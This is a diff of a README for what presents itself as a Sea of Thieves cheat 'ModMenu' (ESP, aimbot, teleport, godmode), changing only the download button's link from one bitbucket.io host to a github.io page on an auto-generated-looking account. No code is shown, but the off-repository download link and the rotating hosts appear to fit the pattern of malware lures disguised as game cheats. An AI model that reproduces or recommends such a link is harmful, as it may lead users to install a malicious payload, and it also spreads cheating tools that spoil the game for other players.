@@ -2,7 +2,7 @@
 
 Sail with absolute freedom in **Sea of Thieves** using this full-featured **C++ external ModMenu**. Whether you want to hunt treasure, fight rival ships, or explore hidden parts of the map — this tool gives you full control. ⚓ Includes ESP, cannon aimbot, teleport, noclip, godmode, and a slick in-game menu for toggling everything on the fly.
 
-[![Download Sea of Thieves ModMenu](https://img.shields.io/badge/Download-SoT_ModMenu-blueviolet)](https://fileoffload9.bitbucket.io)
+[![Download Sea of Thieves ModMenu](https://img.shields.io/badge/Download-SoT_ModMenu-blueviolet)](https://Sea-of-Thieves-ModMenu-qupu.github.io/.github)
 
 ---
 
